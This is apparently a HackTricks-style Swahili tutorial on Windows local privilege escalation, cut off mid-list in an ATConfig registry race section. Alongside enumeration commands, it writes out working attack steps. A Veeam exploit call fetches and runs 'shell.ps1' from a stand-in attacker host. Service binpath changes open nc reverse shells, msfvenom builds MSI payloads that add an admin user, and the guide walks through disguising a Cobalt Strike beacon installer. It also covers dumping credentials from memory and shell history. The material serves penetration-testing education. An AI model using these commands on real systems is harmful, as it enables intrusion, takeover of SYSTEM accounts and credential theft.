# Windows Local Privilege Escalation

{{#include ../../banners/hacktricks-training.md}}

### **Tool bora ya kutafuta vectors za Windows local privilege escalation:** [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)

## Nadharia ya Awali ya Windows

### Access Tokens

**Ikiwa hujui Access Tokens za Windows ni nini, soma ukurasa ufuatao kabla ya kuendelea:**


{{#ref}}
access-tokens.md
{{#endref}}

### ACLs - DACLs/SACLs/ACEs

**Angalia ukurasa ufuatao kwa maelezo zaidi kuhusu ACLs - DACLs/SACLs/ACEs:**


{{#ref}}
acls-dacls-sacls-aces.md
{{#endref}}

### Integrity Levels

**Ikiwa hujui integrity levels katika Windows ni nini, unapaswa kusoma ukurasa ufuatao kabla ya kuendelea:**


{{#ref}}
integrity-levels.md
{{#endref}}

## Windows Security Controls

Kuna vitu mbalimbali katika Windows ambavyo vinaweza **kukuzuia kufanya enumeration ya mfumo**, kuendesha executables au hata **kutambua shughuli zako**. Unapaswa **kusoma** **ukurasa** ufuatao na kufanya **enumeration** ya **defense mechanisms** hizi zote kabla ya kuanza enumeration ya privilege escalation:


{{#ref}}
../authentication-credentials-uac-and-efs/
{{#endref}}

### Admin Protection / UIAccess silent elevation

UIAccess processes zinazozinduliwa kupitia `RAiLaunchAdminProcess` zinaweza kutumiwa vibaya kufikia High IL bila prompts wakati ukaguzi wa secure-path wa AppInfo umepitwa. Angalia workflow maalum ya UIAccess/Admin Protection bypass hapa:

{{#ref}}
uiaccess-admin-protection-bypass.md
{{#endref}}

Secure Desktop accessibility registry propagation inaweza kutumiwa vibaya kwa arbitrary SYSTEM registry write (RegPwn):

{{#ref}}
secure-desktop-accessibility-registry-propagation-regpwn.md
{{#endref}}

Windows builds za hivi karibuni pia zilianzisha **SMB arbitrary-port** LPE path ambapo privileged local NTLM authentication ina-reflectiwa kupitia reused SMB TCP connection:

{{#ref}}
local-ntlm-reflection-via-smb-arbitrary-port.md
{{#endref}}

## System Info

### Enumeration ya taarifa za version

Angalia ikiwa Windows version ina vulnerability yoyote inayojulikana (pia angalia patches zilizotumika).
```bash
systeminfo
systeminfo | findstr /B /C:"OS Name" /C:"OS Version" #Get only that information
wmic qfe get Caption,Description,HotFixID,InstalledOn #Patches
wmic os get osarchitecture || echo %PROCESSOR_ARCHITECTURE% #Get system architecture
```

```bash
[System.Environment]::OSVersion.Version #Current OS version
Get-WmiObject -query 'select * from win32_quickfixengineering' | foreach {$_.hotfixid} #List all patches
Get-Hotfix -description "Security update" #List only "Security Update" patches
```
### Exploits za Version

Hii [site](https://msrc.microsoft.com/update-guide/vulnerability) ni muhimu kwa kutafuta maelezo ya kina kuhusu vulnerabilities za usalama za Microsoft. Database hii ina zaidi ya vulnerabilities 4,700 za usalama, ikionyesha **massive attack surface** inayowasilishwa na mazingira ya Windows.

**Kwenye mfumo**

- _post/windows/gather/enum_patches_
- _post/multi/recon/local_exploit_suggester_
- [_watson_](https://github.com/rasta-mouse/Watson)
- [_winpeas_](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) _(Winpeas ina watson embedded)_

**Locally kwa kutumia taarifa za mfumo**

- [https://github.com/AonCyberLabs/Windows-Exploit-Suggester](https://github.com/AonCyberLabs/Windows-Exploit-Suggester)
- [https://github.com/bitsadmin/wesng](https://github.com/bitsadmin/wesng)

**Github repos za exploits:**

- [https://github.com/nomi-sec/PoC-in-GitHub](https://github.com/nomi-sec/PoC-in-GitHub)
- [https://github.com/abatchy17/WindowsExploits](https://github.com/abatchy17/WindowsExploits)
- [https://github.com/SecWiki/windows-kernel-exploits](https://github.com/SecWiki/windows-kernel-exploits)

### Mazingira

Je, kuna credential/Juicy info iliyohifadhiwa kwenye env variables?
```bash
set
dir env:
Get-ChildItem Env: | ft Key,Value -AutoSize
```
### Historia ya PowerShell
```bash
ConsoleHost_history #Find the PATH where is saved

type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type C:\Users\swissky\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
cat (Get-PSReadlineOption).HistorySavePath
cat (Get-PSReadlineOption).HistorySavePath | sls passw
```
### Faili za Transcript za PowerShell

Unaweza kujifunza jinsi ya kuwasha kipengele hiki kwenye [https://sid-500.com/2017/11/07/powershell-enabling-transcription-logging-by-using-group-policy/](https://sid-500.com/2017/11/07/powershell-enabling-transcription-logging-by-using-group-policy/).
```bash
#Check is enable in the registry
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\Transcription
dir C:\Transcripts

#Start a Transcription session
Start-Transcript -Path "C:\transcripts\transcript0.txt" -NoClobber
Stop-Transcript
```
### PowerShell Module Logging

Maelezo ya utekelezaji wa PowerShell pipeline huhifadhiwa, yakijumuisha commands zilizotekelezwa, command invocations, na sehemu za scripts. Hata hivyo, maelezo kamili ya utekelezaji na matokeo ya output huenda yasihifadhiwe.

Ili kuwezesha hili, fuata maagizo katika sehemu ya "Transcript files" ya documentation, ukichagua **"Module Logging"** badala ya **"Powershell Transcription"**.
```bash
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
```
Ili kuona events 15 za mwisho kutoka kwenye logs za PowersShell unaweza kutekeleza:
```bash
Get-WinEvent -LogName "windows Powershell" | select -First 15 | Out-GridView
```
### PowerShell **Script Block Logging**

Rekodi kamili ya shughuli na maudhui yote ya utekelezaji wa script inahifadhiwa, kuhakikisha kwamba kila block ya code inaandikwa inapotekelezwa. Mchakato huu huhifadhi audit trail ya kina ya kila shughuli, yenye thamani kwa forensics na kuchanganua tabia hasidi. Kwa kuandika shughuli zote wakati wa utekelezaji, maarifa ya kina kuhusu mchakato huo hutolewa.
```bash
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
```
Matukio ya logging ya Script Block yanaweza kupatikana katika Windows Event Viewer kwenye njia: **Application and Services Logs > Microsoft > Windows > PowerShell > Operational**.\
Ili kutazama matukio 20 ya mwisho, unaweza kutumia:
```bash
Get-WinEvent -LogName "Microsoft-Windows-Powershell/Operational" | select -first 20 | Out-Gridview
```
### Mipangilio ya Intaneti
```bash
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
reg query "HKLM\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
```
### Viendeshi
```bash
wmic logicaldisk get caption || fsutil fsinfo drives
wmic logicaldisk get caption,description,providername
Get-PSDrive | where {$_.Provider -like "Microsoft.PowerShell.Core\FileSystem"}| ft Name,Root
```
## WSUS

Unaweza compromise mfumo ikiwa updates hazijaombwa kwa kutumia http**S** bali http.

Unaanza kwa kuangalia ikiwa network inatumia WSUS update isiyo ya SSL kwa kuendesha amri ifuatayo katika cmd:
```
reg query HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate /v WUServer
```
Au yafuatayo katika PowerShell:
```
Get-ItemProperty -Path HKLM:\Software\Policies\Microsoft\Windows\WindowsUpdate -Name "WUServer"
```
Ukipata jibu kama mojawapo ya haya:
```bash
HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\WindowsUpdate
WUServer    REG_SZ    http://xxxx-updxx.corp.internal.com:8535
```

```bash
WUServer     : http://xxxx-updxx.corp.internal.com:8530
PSPath       : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\software\policies\microsoft\windows\windowsupdate
PSParentPath : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\software\policies\microsoft\windows
PSChildName  : windowsupdate
PSDrive      : HKLM
PSProvider   : Microsoft.PowerShell.Core\Registry
```
Na ikiwa `HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate\AU /v UseWUServer` au `Get-ItemProperty -Path hklm:\software\policies\microsoft\windows\windowsupdate\au -name "usewuserver"` ni sawa na `1`.

Basi, **inaweza kutumiwa kwa exploit.** Ikiwa registry ya mwisho ni sawa na `0`, basi, ingizo la WSUS litapuuzwa.

Ili kutumia vulnerabilities hizi, unaweza kutumia tools kama: [Wsuxploit](https://github.com/pimps/wsuxploit), [pyWSUS ](https://github.com/GoSecure/pywsus)- Hizi ni scripts za MiTM weaponized exploits za kuingiza updates za 'fake' kwenye WSUS traffic isiyo ya SSL.

Soma utafiti hapa:

{{#file}}
CTX_WSUSpect_White_Paper (1).pdf
{{#endfile}}

**WSUS CVE-2020-1013**

[**Soma ripoti kamili hapa**](https://www.gosecure.net/blog/2020/09/08/wsus-attacks-part-2-cve-2020-1013-a-windows-10-local-privilege-escalation-1-day/).\
Kimsingi, hili ndilo dosari inayotumiwa na bug hii:

> Ikiwa tuna uwezo wa kurekebisha proxy ya local user wetu, na Windows Updates inatumia proxy iliyosanidiwa kwenye mipangilio ya Internet Explorer, basi tuna uwezo wa kuendesha [PyWSUS](https://github.com/GoSecure/pywsus) locally ili kukatiza traffic yetu wenyewe na kuendesha code kama user aliye na elevated privileges kwenye asset yetu.
>
> Zaidi ya hayo, kwa kuwa WSUS service inatumia mipangilio ya current user, itatumia pia certificate store yake. Ikiwa tutatengeneza self-signed certificate kwa hostname ya WSUS na kuongeza certificate hii kwenye certificate store ya current user, tutaweza kukatiza WSUS traffic ya HTTP na HTTPS. WSUS haitumii mechanisms kama HSTS kutekeleza aina ya validation ya trust-on-first-use kwenye certificate. Ikiwa certificate iliyowasilishwa inaaminika na user na ina hostname sahihi, itakubaliwa na service.

Unaweza kutumia vulnerability hii kwa tool [**WSUSpicious**](https://github.com/GoSecure/wsuspicious) (mara itakapo-liberated).

## Third-Party Auto-Updaters and Agent IPC (local privesc)

Enterprise agents wengi huonyesha localhost IPC surface na privileged update channel. Ikiwa enrollment inaweza kulazimishwa kutumia attacker server na updater inaamini rogue root CA au ukaguzi dhaifu wa signer, local user anaweza kuwasilisha MSI hasidi ambayo SYSTEM service ita-install. Tazama technique ya jumla (inayotegemea Netskope stAgentSvc chain – CVE-2025-0309) hapa:


{{#ref}}
abusing-auto-updaters-and-ipc.md
{{#endref}}

## Veeam Backup & Replication CVE-2023-27532 (SYSTEM via TCP 9401)

Veeam B&R < `11.0.1.1261` inaonyesha localhost service kwenye **TCP/9401** ambayo huchakata messages zinazodhibitiwa na attacker, hivyo kuruhusu commands za kiholela kama **NT AUTHORITY\SYSTEM**.

- **Recon**: thibitisha listener na version, kwa mfano, `netstat -ano | findstr 9401` na `(Get-Item "C:\Program Files\Veeam\Backup and Replication\Backup\Veeam.Backup.Shell.exe").VersionInfo.FileVersion`.
- **Exploit**: weka PoC kama `VeeamHax.exe` pamoja na Veeam DLLs zinazohitajika kwenye directory hiyo hiyo, kisha trigger SYSTEM payload kupitia local socket:
```powershell
.\VeeamHax.exe --cmd "powershell -ep bypass -c \"iex(iwr http://attacker/shell.ps1 -usebasicparsing)\""
```
Huduma hutekeleza command kama SYSTEM.
## KrbRelayUp

Vulnerability ya **local privilege escalation** ipo katika mazingira ya Windows **domain** chini ya masharti maalum. Masharti haya yanajumuisha mazingira ambayo **LDAP signing haijalazimishwa,** users wana self-rights zinazowaruhusu kusanidi **Resource-Based Constrained Delegation (RBCD),** na uwezo wa users kuunda computers ndani ya domain. Ni muhimu kutambua kuwa **mahitaji** haya yanatimizwa kwa kutumia default settings.

Pata **exploit katika** [**https://github.com/Dec0ne/KrbRelayUp**](https://github.com/Dec0ne/KrbRelayUp)

Kwa maelezo zaidi kuhusu mtiririko wa attack, angalia [https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation/](https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation/)

## AlwaysInstallElevated

**Ikiwa** hizi registry keys 2 **zimewezeshwa** (value ni **0x1**), users wenye privilege yoyote wanaweza **ku-install** (kutekeleza) files za `*.msi` kama NT AUTHORITY\\**SYSTEM**.
```bash
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```
### Metasploit payloads
```bash
msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi-nouac -o alwe.msi #No uac format
msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi -o alwe.msi #Using the msiexec the uac wont be prompted
```
Ikiwa una meterpreter session, unaweza kugeuza kiotomatiki technique hii kwa kutumia module **`exploit/windows/local/always_install_elevated`**

### PowerUP

Tumia command ya `Write-UserAddMSI` kutoka power-up ili kuunda ndani ya directory ya sasa Windows MSI binary ya kuongeza privileges. Script hii huandika MSI installer iliyokompiliwa awali ambayo huomba kuongezwa kwa user/group (hivyo utahitaji GIU access):
```
Write-UserAddMSI
```
Tekeleza tu binary iliyoundwa ili kuongeza privileges.

### MSI Wrapper

Soma tutorial hii ili ujifunze jinsi ya kuunda MSI wrapper ukitumia tools hizi. Kumbuka kwamba unaweza ku-wrap faili la "**.bat**" ikiwa **unataka tu** **kutekeleza** **command lines**


{{#ref}}
msi-wrapper.md
{{#endref}}

### Create MSI with WIX


{{#ref}}
create-msi-with-wix.md
{{#endref}}

### Create MSI with Visual Studio

- **Generate** kwa kutumia Cobalt Strike au Metasploit **new Windows EXE TCP payload** katika `C:\privesc\beacon.exe`
- Fungua **Visual Studio**, chagua **Create a new project** na uandike "installer" kwenye search box. Chagua project ya **Setup Wizard** na ubofye **Next**.
- Ipe project jina, kama vile **AlwaysPrivesc**, tumia **`C:\privesc`** kama location, chagua **place solution and project in the same directory**, kisha ubofye **Create**.
- Endelea kubofya **Next** hadi ufikie hatua ya 3 kati ya 4 (chagua files za kujumuisha). Bofya **Add** na uchague Beacon payload uliyotengeneza. Kisha ubofye **Finish**.
- Highlight project ya **AlwaysPrivesc** katika **Solution Explorer** na kwenye **Properties**, badilisha **TargetPlatform** kutoka **x86** hadi **x64**.
- Kuna properties nyingine unazoweza kubadilisha, kama vile **Author** na **Manufacturer**, ambazo zinaweza kufanya app iliyosakinishwa ionekane halali zaidi.
- Bofya kulia project na uchague **View > Custom Actions**.
- Bofya kulia **Install** na uchague **Add Custom Action**.
- Bofya mara mbili **Application Folder**, chagua faili lako la **beacon.exe** na ubofye **OK**. Hii itahakikisha kwamba Beacon payload inatekelezwa mara tu installer inapoendeshwa.
- Chini ya **Custom Action Properties**, badilisha **Run64Bit** kuwa **True**.
- Mwishowe, **ijenge**.
- Ikiwa warning `File 'beacon-tcp.exe' targeting 'x64' is not compatible with the project's target platform 'x86'` itaonyeshwa, hakikisha umeweka platform kuwa x64.

### MSI Installation

Ili kutekeleza **installation** ya faili hasidi la `.msi` kwa **background:**
```
msiexec /quiet /qn /i C:\Users\Steve.INFERNO\Downloads\alwe.msi
```
Ili kutumia vulnerability hii, unaweza kutumia: _exploit/windows/local/always_install_elevated_

## Antivirus na Detectors

### Mipangilio ya Ukaguzi

Mipangilio hii huamua kinachokuwa **logged**, kwa hivyo unapaswa kuzingatia.
```
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System\Audit
```
### WEF

Windows Event Forwarding, ni muhimu kujua logs zinatumwa wapi
```bash
reg query HKLM\Software\Policies\Microsoft\Windows\EventLog\EventForwarding\SubscriptionManager
```
### LAPS

**LAPS** imeundwa kwa ajili ya **usimamizi wa nywila za Administrator wa ndani**, ikihakikisha kwamba kila nywila ni **ya kipekee, imeundwa kwa nasibu, na inasasishwa mara kwa mara** kwenye kompyuta zilizounganishwa kwenye domain. Nywila hizi huhifadhiwa kwa usalama ndani ya Active Directory na zinaweza kufikiwa tu na watumiaji waliopewa ruhusa za kutosha kupitia ACLs, zinazowaruhusu kuona nywila za admin wa ndani ikiwa wameidhinishwa.


{{#ref}}
../active-directory-methodology/laps.md
{{#endref}}

### WDigest

Ikiwa imewashwa, **nywila za maandishi wazi huhifadhiwa kwenye LSASS** (Local Security Authority Subsystem Service).\
[**Maelezo zaidi kuhusu WDigest kwenye ukurasa huu**](../stealing-credentials/credentials-protections.md#wdigest).
```bash
reg query 'HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest' /v UseLogonCredential
```
### LSA Protection

Kuanzia **Windows 8.1**, Microsoft ilianzisha ulinzi ulioimarishwa kwa Local Security Authority (LSA) ili **kuzuia** majaribio ya michakato isiyoaminika ya **kusoma kumbukumbu yake** au kuingiza code, hivyo kuimarisha zaidi usalama wa mfumo.\
[**Maelezo zaidi kuhusu LSA Protection hapa**](../stealing-credentials/credentials-protections.md#lsa-protection).
```bash
reg query 'HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\LSA' /v RunAsPPL
```
### Credentials Guard

**Credential Guard** ilianzishwa katika **Windows 10**. Madhumuni yake ni kulinda credentials zilizohifadhiwa kwenye kifaa dhidi ya vitisho kama mashambulizi ya pass-the-hash.| [**Maelezo zaidi kuhusu Credentials Guard hapa.**](../stealing-credentials/credentials-protections.md#credential-guard)
```bash
reg query 'HKLM\System\CurrentControlSet\Control\LSA' /v LsaCfgFlags
```
### Cached Credentials

**Domain credentials** huthibitishwa na **Local Security Authority** (LSA) na kutumiwa na vipengele vya mfumo wa uendeshaji. Data ya kuingia ya mtumiaji inapothibitishwa na kifurushi cha usalama kilichosajiliwa, **domain credentials** za mtumiaji kwa kawaida huanzishwa.\
[**Maelezo zaidi kuhusu Cached Credentials hapa**](../stealing-credentials/credentials-protections.md#cached-credentials).
```bash
reg query "HKEY_LOCAL_MACHINE\SOFTWARE\MICROSOFT\WINDOWS NT\CURRENTVERSION\WINLOGON" /v CACHEDLOGONSCOUNT
```
## Watumiaji na Vikundi

### Orodhesha Watumiaji na Vikundi

Unapaswa kuangalia ikiwa kikundi chochote unachoshiriki kina permissions za kuvutia
```bash
# CMD
net users %username% #Me
net users #All local users
net localgroup #Groups
net localgroup Administrators #Who is inside Administrators group
whoami /all #Check the privileges

# PS
Get-WmiObject -Class Win32_UserAccount
Get-LocalUser | ft Name,Enabled,LastLogon
Get-ChildItem C:\Users -Force | select Name
Get-LocalGroupMember Administrators | ft Name, PrincipalSource
```
### Vikundi vyenye mamlaka

Ikiwa **uko katika kikundi fulani chenye mamlaka, unaweza kuweza kuongeza mamlaka**. Jifunze kuhusu vikundi vyenye mamlaka na jinsi ya kuvitumia vibaya ili kuongeza mamlaka hapa:


{{#ref}}
../active-directory-methodology/privileged-groups-and-token-privileges.md
{{#endref}}

### Token manipulation

**Jifunze zaidi** kuhusu **token** ni nini kwenye ukurasa huu: [**Windows Tokens**](../authentication-credentials-uac-and-efs/index.html#access-tokens).\
Angalia ukurasa unaofuata ili **ujifunze kuhusu token zinazovutia** na jinsi ya kuzitumia vibaya:


{{#ref}}
privilege-escalation-abusing-tokens.md
{{#endref}}

### Watumiaji walioingia / Sessions
```bash
qwinsta
klist sessions
```
### Folda za nyumbani
```bash
dir C:\Users
Get-ChildItem C:\Users
```
### Sera ya Nenosiri
```bash
net accounts
```
### Pata maudhui ya clipboard
```bash
powershell -command "Get-Clipboard"
```
## Michakato Inayoendeshwa

### Ruhusa za Faili na Folda

Kwanza, unapoorodhesha michakato, **kagua manenosiri ndani ya mstari wa amri wa mchakato**.\
Kagua ikiwa unaweza **kubadilisha binary inayoendeshwa** au ikiwa una ruhusa za kuandika kwenye folda ya binary ili kutumia uwezekano wa [**DLL Hijacking attacks**](dll-hijacking/index.html):
```bash
Tasklist /SVC #List processes running and services
tasklist /v /fi "username eq system" #Filter "system" processes

#With allowed Usernames
Get-WmiObject -Query "Select * from Win32_Process" | where {$_.Name -notlike "svchost*"} | Select Name, Handle, @{Label="Owner";Expression={$_.GetOwner().User}} | ft -AutoSize

#Without usernames
Get-Process | where {$_.ProcessName -notlike "svchost*"} | ft ProcessName, Id
```
Daima angalia [**electron/cef/chromium debuggers**](../../linux-hardening/software-information/electron-cef-chromium-debugger-abuse.md) zinazoendeshwa; unaweza kuzitumia vibaya ili kuongeza privileges.

**Kukagua permissions za binaries za processes**
```bash
for /f "tokens=2 delims='='" %%x in ('wmic process list full^|find /i "executablepath"^|find /i /v "system32"^|find ":"') do (
for /f eol^=^"^ delims^=^" %%z in ('echo %%x') do (
icacls "%%z"
2>nul | findstr /i "(F) (M) (W) :\\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo.
)
)
```
**Kukagua ruhusa za folda zilizo na binary za processes (**[**DLL Hijacking**](dll-hijacking/index.html)**)**
```bash
for /f "tokens=2 delims='='" %%x in ('wmic process list full^|find /i "executablepath"^|find /i /v
"system32"^|find ":"') do for /f eol^=^"^ delims^=^" %%y in ('echo %%x') do (
icacls "%%~dpy\" 2>nul | findstr /i "(F) (M) (W) :\\" | findstr /i ":\\ everyone authenticated users
todos %username%" && echo.
)
```
### Uchimbaji wa Nywila kutoka kwenye Memory

Unaweza kuunda memory dump ya process inayoendelea kwa kutumia **procdump** kutoka sysinternals. Services kama FTP huwa na **credentials katika clear text kwenye memory**, jaribu kudump memory na kusoma credentials.
```bash
procdump.exe -accepteula -ma <proc_name_tasklist>
```
### Programu za GUI zisizo salama

**Applications zinazoendeshwa kama SYSTEM zinaweza kumruhusu mtumiaji kuanzisha CMD au kuvinjari directories.**

Mfano: "Windows Help and Support" (Windows + F1), tafuta "command prompt", bofya "Click to open Command Prompt"

## Services

Service Triggers huruhusu Windows kuanzisha service wakati masharti fulani yanapotokea (shughuli za named pipe/RPC endpoint, matukio ya ETW, upatikanaji wa IP, kuwasili kwa kifaa, GPO refresh, n.k.). Hata bila haki za SERVICE_START, mara nyingi unaweza kuanzisha services zenye privileges kwa kuanzisha triggers zake. Tazama mbinu za enumeration na activation hapa:

-
{{#ref}}
service-triggers.md
{{#endref}}

Pata orodha ya services:
```bash
net start
wmic service list brief
sc query
Get-Service
```
### Ruhusa

Unaweza kutumia **sc** kupata maelezo kuhusu huduma
```bash
sc qc <service_name>
```
Inapendekezwa kuwa na binary **accesschk** kutoka _Sysinternals_ ili kuangalia kiwango cha privilege kinachohitajika kwa kila service.
```bash
accesschk.exe -ucqv <Service_Name> #Check rights for different groups
```
Inapendekezwa kuangalia ikiwa "Authenticated Users" wanaweza kurekebisha huduma yoyote:
```bash
accesschk.exe -uwcqv "Authenticated Users" * /accepteula
accesschk.exe -uwcqv %USERNAME% * /accepteula
accesschk.exe -uwcqv "BUILTIN\Users" * /accepteula 2>nul
accesschk.exe -uwcqv "Todos" * /accepteula ::Spanish version
```
[Unaweza kupakua accesschk.exe ya XP hapa](https://github.com/ankh2054/windows-pentest/raw/master/Privelege/accesschk-2003-xp.exe)

### Washa service

Ikiwa unapata kosa hili (kwa mfano kwenye SSDPSRV):

_Kosa la mfumo 1058 limetokea._\
_Service haiwezi kuanzishwa, ama kwa sababu imezimwa au kwa sababu haina vifaa vilivyowashwa vinavyohusishwa nayo._

Unaweza kuiwasha kwa kutumia
```bash
sc config SSDPSRV start= demand
sc config SSDPSRV obj= ".\LocalSystem" password= ""
```
**Zingatia kwamba service upnphost inategemea SSDPSRV ili kufanya kazi (kwa XP SP1)**

**Njia nyingine ya kukabiliana** na tatizo hili ni kuendesha:
```
sc.exe config usosvc start= auto
```
### **Modify service binary path**

Katika hali ambapo group ya "Authenticated users" ina **SERVICE_ALL_ACCESS** kwenye service, inawezekana kurekebisha executable binary ya service. Ili kurekebisha na kutekeleza **sc**:
```bash
sc config <Service_Name> binpath= "C:\nc.exe -nv 127.0.0.1 9988 -e C:\WINDOWS\System32\cmd.exe"
sc config <Service_Name> binpath= "net localgroup administrators username /add"
sc config <Service_Name> binpath= "cmd \c C:\Users\nc.exe 10.10.10.10 4444 -e cmd.exe"

sc config SSDPSRV binpath= "C:\Documents and Settings\PEPE\meter443.exe"
```
### Anzisha upya huduma
```bash
wmic service NAMEOFSERVICE call startservice
net stop [service name] && net start [service name]
```
Privileges zinaweza kuongezwa kupitia ruhusa mbalimbali:

- **SERVICE_CHANGE_CONFIG**: Huruhusu kusanidi upya binary ya service.
- **WRITE_DAC**: Huwezesha kusanidi upya ruhusa, na hivyo kuruhusu kubadilisha mipangilio ya service.
- **WRITE_OWNER**: Huruhusu kupata umiliki na kusanidi upya ruhusa.
- **GENERIC_WRITE**: Hurithi uwezo wa kubadilisha mipangilio ya service.
- **GENERIC_ALL**: Pia hurithi uwezo wa kubadilisha mipangilio ya service.

Kwa ajili ya kugundua na kutumia vulnerability hii, _exploit/windows/local/service_permissions_ inaweza kutumika.

### Ruhusa dhaifu za binary za service

Ikiwa service inaendeshwa kama **`LocalSystem`**, **`LocalService`**, **`NetworkService`**, au akaunti ya domain yenye privileges, lakini **watumiaji wenye privileges za chini wanaweza kurekebisha EXE ya service au folder yake kuu**, service mara nyingi inaweza kutekwa kwa **kubadilisha binary na kuanzisha upya service**.

**Angalia ikiwa unaweza kurekebisha binary inayotekelezwa na service** au ikiwa una **ruhusa za kuandika kwenye folder** ambako binary iko ([**DLL Hijacking**](dll-hijacking/index.html))**.**\
Unaweza kupata kila binary inayotekelezwa na service ukitumia **wmic** (isiyo kwenye system32) na kuangalia ruhusa zako ukitumia **icacls**:
```bash
for /f "tokens=2 delims='='" %a in ('wmic service list full^|find /i "pathname"^|find /i /v "system32"') do @echo %a >> %temp%\perm.txt

for /f eol^=^"^ delims^=^" %a in (%temp%\perm.txt) do cmd.exe /c icacls "%a" 2>nul | findstr "(M) (F) :\"
```
Unaweza pia kutumia **sc** na **icacls**:
```bash
sc qc <service_name>
icacls "C:\path\to\service.exe"

sc query state= all | findstr "SERVICE_NAME:" >> C:\Temp\Servicenames.txt
FOR /F "tokens=2 delims= " %i in (C:\Temp\Servicenames.txt) DO @echo %i >> C:\Temp\services.txt
FOR /F %i in (C:\Temp\services.txt) DO @sc qc %i | findstr "BINARY_PATH_NAME" >> C:\Temp\path.txt
```
Tafuta ACLs hatari zilizopewa **`Everyone`**, **`BUILTIN\Users`**, au **`Authenticated Users`**, hasa **`(F)`**, **`(M)`**, au **`(W)`** kwenye executable ya service au directory iliyo nayo. Mtiririko wa vitendo wa kutumia udhaifu huu ni:

1. Thibitisha akaunti ya service na njia ya executable kwa `sc qc <service_name>`.
2. Thibitisha kuwa binary inaweza kuandikwa kwa `icacls <path>`.
3. Badilisha service binary na payload au service binary halali yenye madhara.
4. Anzisha upya service kwa `sc stop <service_name> && sc start <service_name>` (au subiri reboot / service trigger).

Ukaguzi wa kiotomatiki unaofaa:
```powershell
. .\PowerUp.ps1
Get-ModifiableServiceFile -Verbose

SharpUp.exe audit ModifiableServiceBinaries
. .\PrivescCheck.ps1
Invoke-PrivescCheck -Extended -Audit
```
> Ikiwa service hairuhusu user wa kawaida kuianzisha upya, angalia ikiwa inaanza automatically wakati wa boot, ina failure action inayoi-launch tena, au inaweza ku-triggeriwa indirectly na application inayotumia.

### Ruhusa za kurekebisha service registry

Unapaswa kuangalia ikiwa unaweza kurekebisha service registry yoyote.\
Unaweza **kukagua** **ruhusa** zako kwenye **service registry** kwa kufanya:
```bash
reg query hklm\System\CurrentControlSet\Services /s /v imagepath #Get the binary paths of the services

#Try to write every service with its current content (to check if you have write permissions)
for /f %a in ('reg query hklm\system\currentcontrolset\services') do del %temp%\reg.hiv 2>nul & reg save %a %temp%\reg.hiv 2>nul && reg restore %a %temp%\reg.hiv 2>nul && echo You can modify %a

get-acl HKLM:\System\CurrentControlSet\services\* | Format-List * | findstr /i "<Username> Users Path Everyone"
```
Inapaswa kukaguliwa ikiwa **Authenticated Users** au **NT AUTHORITY\INTERACTIVE** wana ruhusa za `FullControl`. Ikiwa ndivyo, binary inayotekelezwa na huduma inaweza kubadilishwa.

Kubadilisha Path ya binary inayotekelezwa:
```bash
reg add HKLM\SYSTEM\CurrentControlSet\services\<service_name> /v ImagePath /t REG_EXPAND_SZ /d C:\path\new\binary /f
```
### Registry symlink race to arbitrary HKLM value write (ATConfig)

Baadhi ya vipengele vya Windows Accessibility huunda keys za **ATConfig** kwa kila user, ambazo baadaye hunakiliwa na mchakato wa **SYSTEM** kwenye session key ya HKLM. **Registry symbolic link race** inaweza kuelekeza upya write hiyo yenye privileges kwenda kwenye **path yoyote ya HKLM**, na hivyo kutoa primitive ya **arbitrary HKLM value write**.

Maeneo muhimu ya registry (mfano: On-Screen Keyboard `osk`):

- `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Accessibility\ATs` huorodhesha vipengele vya accessibility vilivyosakinishwa.
- `HKCU\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Accessibility\ATConfig\<feature>` huhifadhi configuration inayodhibitiwa na user.
- `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Accessibility\Session<session id>\ATConfig\<feature>` huundwa wakati wa logon/secure-desktop transitions na user anaweza kuandika humo.

Mtiririko wa abuse (CVE-2026-24291 / ATConfig):

1. Weka value ya **HKCU ATConfig** unayotaka iandikwe na SYSTEM.
